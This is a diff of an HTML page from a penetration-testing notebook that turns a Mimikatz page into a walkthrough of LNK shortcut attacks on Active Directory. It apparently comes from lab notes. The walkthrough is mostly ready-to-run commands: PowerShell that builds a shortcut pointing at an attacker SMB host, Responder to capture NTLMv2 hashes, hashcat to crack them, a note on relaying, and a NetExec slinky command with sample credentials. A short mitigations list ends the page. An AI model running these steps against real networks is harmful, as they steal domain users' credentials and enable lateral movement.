@@ -8,7 +8,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
-    <title>Pass Attacks with Mimikatz &#8212; MyHackBook</title>
+    <title>LNK File Attacks &#8212; MyHackBook</title>
   
   
   
@@ -43,11 +43,11 @@
     <script src="../../../_static/doctools.js?v=fd6eb6e6"></script>
     <script src="../../../_static/sphinx_highlight.js?v=6ffebe34"></script>
     <script src="../../../_static/scripts/sphinx-book-theme.js?v=fab101a9"></script>
-    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/post-compromise-attacks/mimikatz';</script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/post-compromise-attacks/lnk-file-attacks';</script>
     <link rel="index" title="Index" href="../../../genindex.html" />
     <link rel="search" title="Search" href="../../../search.html" />
-    <link rel="next" title="Kerberoasting" href="kerberoasting.html" />
-    <link rel="prev" title="Pass Attacks" href="pass-attacks.html" />
+    <link rel="next" title="GPP cPassword Attacks" href="gpp-cPassword-attacks.html" />
+    <link rel="prev" title="Token Impersonation" href="token-impersonation.html" />
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <meta name="docsearch:language" content="en"/>
   <meta name="docsearch:version" content="" />
@@ -172,10 +172,10 @@
 </details></li>
 <li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Post Compromise Attacks</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
 <li class="toctree-l4"><a class="reference internal" href="pass-attacks.html">Pass Attacks</a></li>
-<li class="toctree-l4 current active"><a class="current reference internal" href="#">Pass Attacks with Mimikatz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="mimikatz.html">Pass Attacks with Mimikatz</a></li>
 <li class="toctree-l4"><a class="reference internal" href="kerberoasting.html">Kerberoasting</a></li>
 <li class="toctree-l4"><a class="reference internal" href="token-impersonation.html">Token Impersonation</a></li>
-<li class="toctree-l4"><a class="reference internal" href="lnk-file-attacks.html">LNK File Attacks</a></li>
+<li class="toctree-l4 current active"><a class="current reference internal" href="#">LNK File Attacks</a></li>
 <li class="toctree-l4"><a class="reference internal" href="gpp-cPassword-attacks.html">GPP cPassword Attacks</a></li>
 </ul>
 </details></li>
@@ -264,7 +264,7 @@
       
       
       
-      <li><a href="../../../_sources/Active Directory/attacking-ad/post-compromise-attacks/mimikatz.md" target="_blank"
+      <li><a href="../../../_sources/Active Directory/attacking-ad/post-compromise-attacks/lnk-file-attacks.md" target="_blank"
    class="btn btn-sm btn-download-source-button dropdown-item"
    title="Download source file"
    data-bs-placement="left" data-bs-toggle="tooltip"
@@ -327,7 +327,9 @@
 <button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
     <i class="fa-solid fa-magnifying-glass fa-lg"></i>
 </button>
-
+<button class="sidebar-toggle secondary-toggle btn btn-sm pst-navbar-icon" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
 </div></div>
       
     </div>
@@ -338,11 +340,21 @@
               
 
 <div id="jb-print-docs-body" class="onlyprint">
-    <h1>Pass Attacks with Mimikatz</h1>
+    <h1>LNK File Attacks</h1>
     <!-- Table of contents -->
     <div id="print-main-content">
         <div id="jb-print-toc">
             
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#automated-attack-using-netexec">Automated Attack Using NetExec</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
+</ul>
+            </nav>
         </div>
     </div>
 </div>
@@ -352,8 +364,90 @@
 <div id="searchbox"></div>
                 <article class="bd-article">
                   
-  <section id="pass-attacks-with-mimikatz">
-<h1>Pass Attacks with Mimikatz<a class="headerlink" href="#pass-attacks-with-mimikatz" title="Link to this heading">#</a></h1>
+  <section id="lnk-file-attacks">
+<h1>LNK File Attacks<a class="headerlink" href="#lnk-file-attacks" title="Link to this heading">#</a></h1>
+<ul class="simple">
+<li><p>LNK files (Windows shortcuts) can be used as a waterhole approach to capture user credentials.</p></li>
+<li><p>Placing a malicious LNK file in a shared folder leverages user curiosity and normal file access behavior.</p></li>
+<li><p>When a user opens or browses the shared folder, Windows automatically attempts to load the icon from the attacker’s server.</p></li>
+<li><p>This automatic SMB connection attempt can be intercepted with Responder to capture NTLMv2 hashes.</p></li>
+<li><p>Hashes can then be cracked offline or relayed to other targets.</p></li>
+</ul>
+<section id="walkthrough">
+<h2>Walkthrough<a class="headerlink" href="#walkthrough" title="Link to this heading">#</a></h2>
+<ol class="arabic simple">
+<li><p>Create the Malicious LNK File</p></li>
+</ol>
+<p>Execute the following PowerShell commands line by line from an elevated shell on any domain-joined machine (e.g., a compromised workstation):</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$objShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="n">shell</span>
+<span class="nv">$lnk</span> <span class="p">=</span> <span class="nv">$objShell</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="s2">&quot;C:\test.lnk&quot;</span><span class="p">)</span>
+<span class="nv">$lnk</span><span class="p">.</span><span class="n">TargetPath</span> <span class="p">=</span> <span class="s2">&quot;\\&lt;attacker_ip&gt;\@test.png&quot;</span>
+<span class="nv">$lnk</span><span class="p">.</span><span class="n">WindowStyle</span> <span class="p">=</span> <span class="n">1</span>
+<span class="nv">$lnk</span><span class="p">.</span><span class="n">IconLocation</span> <span class="p">=</span> <span class="s2">&quot;%windir%\system32\shell32.dll, 3&quot;</span>
+<span class="nv">$lnk</span><span class="p">.</span><span class="n">Description</span> <span class="p">=</span> <span class="s2">&quot;Test&quot;</span>
+<span class="nv">$lnk</span><span class="p">.</span><span class="n">HotKey</span> <span class="p">=</span> <span class="s2">&quot;Ctrl+Alt+T&quot;</span>
+<span class="nv">$lnk</span><span class="p">.</span><span class="n">Save</span><span class="p">()</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="2">
+<li><p>Place the LNK File in a Shared Folder</p></li>
+</ol>
+<p>Copy the generated <code class="docutils literal notranslate"><span class="pre">test.lnk</span></code> file to an accessible shared folder (e.g., <code class="docutils literal notranslate"><span class="pre">\\HYDRA-DC\hackme</span></code>). The more visible the location, the more likely users will trigger the attack.</p>
+<figure class="align-center" id="id1">
+<a class="reference internal image-reference" href="../../../_images/lnkfile.png"><img alt="Creating LNK file" src="../../../_images/lnkfile.png" style="width: 100%;" /></a>
+<figcaption>
+<p><span class="caption-text">Creating LNK file</span><a class="headerlink" href="#id1" title="Link to this image">#</a></p>
+</figcaption>
+</figure>
+<ol class="arabic simple" start="3">
+<li><p>Set Up Responder to Capture Hashes</p></li>
+</ol>
+<p>On your attacker machine, start Responder to intercept SMB authentication attempts:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-dPv
+</pre></div>
+</div>
+<ol class="arabic simple" start="4">
+<li><p>Trigger the Attack</p></li>
+</ol>
+<p>When domain users browse or open the shared folder containing the malicious LNK file, Windows automatically attempts to resolve the icon from the attacker’s server. This triggers an SMB authentication request that Responder intercepts.</p>
+<figure class="align-center" id="id2">
+<a class="reference internal image-reference" href="../../../_images/lnkfile-hashes.png"><img alt="Captured NTLMv2 hashes" src="../../../_images/lnkfile-hashes.png" style="width: 100%;" /></a>
+<figcaption>
+<p><span class="caption-text">Captured NTLMv2 hashes</span><a class="headerlink" href="#id2" title="Link to this image">#</a></p>
+</figcaption>
+</figure>
+<ol class="arabic simple" start="5">
+<li><p>Offline Cracking or Relay</p></li>
+</ol>
+<p>Once you capture the NTLMv2 hashes, you can:</p>
+<ul>
+<li><p><strong>Crack offline</strong> using Hashcat (mode 5600 for NTLMv2):</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+</div>
+</li>
+<li><p><strong>Relay the hashes</strong> to other machines for lateral movement using tools like <code class="docutils literal notranslate"><span class="pre">impacket-ntlmrelayx</span></code>.</p></li>
+</ul>
+</section>
+<section id="automated-attack-using-netexec">
+<h2>Automated Attack Using NetExec<a class="headerlink" href="#automated-attack-using-netexec" title="Link to this heading">#</a></h2>
+<p>For a fully automated approach, use NetExec with the Slinky module:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>netexec<span class="w"> </span>smb<span class="w"> </span>&lt;target_ip&gt;<span class="w"> </span>-d<span class="w"> </span>marvel.local<span class="w"> </span>-u<span class="w"> </span>fcastle<span class="w"> </span>-p<span class="w"> </span>Password1<span class="w"> </span>-M<span class="w"> </span>slinky<span class="w"> </span>-o<span class="w"> </span><span class="nv">NAME</span><span class="o">=</span><span class="nb">test</span><span class="w"> </span><span class="nv">SERVER</span><span class="o">=</span>&lt;attacker_ip&gt;
+</pre></div>
+</div>
+<p>This module automatically creates and deploys the malicious LNK file to shared folders, streamlining the waterhole attack.</p>
+</section>
+<section id="mitigations">
+<h2>Mitigations<a class="headerlink" href="#mitigations" title="Link to this heading">#</a></h2>
+<ul class="simple">
+<li><p><strong>Restrict Shared Folder Access</strong>: Limit who can write to shared folders and implement strict access controls.</p></li>
+<li><p><strong>Disable Icon Loading from Network</strong>: Configure Windows to not automatically load icons from remote sources.</p></li>
+<li><p><strong>SMB Signing</strong>: Enforce SMB signing to prevent hash relay attacks.</p></li>
+<li><p><strong>Network Segmentation</strong>: Isolate the attacker’s IP range to prevent capturing credentials across the entire network.</p></li>
+<li><p><strong>User Awareness</strong>: Train users to be cautious when browsing shared folders, especially unfamiliar files.</p></li>
+<li><p><strong>Monitor Shared Folders</strong>: Implement file integrity monitoring to detect malicious file placements.</p></li>
+</ul>
+</section>
 </section>
 
 
@@ -368,20 +462,20 @@
                   
 <div class="prev-next-area">
     <a class="left-prev"
-       href="pass-attacks.html"
+       href="token-impersonation.html"
        title="previous page">
       <i class="fa-solid fa-angle-left"></i>
       <div class="prev-next-info">
         <p class="prev-next-subtitle">previous</p>
-        <p class="prev-next-title">Pass Attacks</p>
+        <p class="prev-next-title">Token Impersonation</p>
       </div>
     </a>
     <a class="right-next"
-       href="kerberoasting.html"
+       href="gpp-cPassword-attacks.html"
        title="next page">
       <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Kerberoasting</p>
+        <p class="prev-next-title">GPP cPassword Attacks</p>
       </div>
       <i class="fa-solid fa-angle-right"></i>
     </a>
@@ -391,6 +485,25 @@
             </div>
             
             
+              
+                <dialog id="pst-secondary-sidebar-modal"></dialog>
+                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item"><div
+    id="pst-page-navigation-heading-2"
+    class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav id="pst-page-toc-nav" class="page-toc" aria-labelledby="pst-page-navigation-heading-2">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#automated-attack-using-netexec">Automated Attack Using NetExec</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
               
             
           </div>
